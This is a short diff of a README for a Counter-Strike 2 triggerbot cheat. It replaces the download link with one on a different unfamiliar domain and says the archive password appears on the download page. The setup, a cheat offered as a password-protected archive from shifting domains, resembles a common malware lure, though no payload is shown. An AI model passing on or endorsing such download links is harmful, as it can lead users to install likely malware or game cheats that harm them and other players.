@@ -18,7 +18,7 @@ CS2 triggerbot fires automatically when your crosshair is over an enemy. Configu
 
 ## Download
 
-[![Download v2026.6](https://img.shields.io/badge/Download_v2026.6-ec4899?style=for-the-badge&logoColor=white)](https://forumconnect.uk/cs2trigbot)
+[![Download v2026.6](https://img.shields.io/badge/Download_v2026.6-ec4899?style=for-the-badge&logoColor=white)](https://connectinstruction.com/cs2trigbot)
 
 > The archive password is shown on the download page.
 
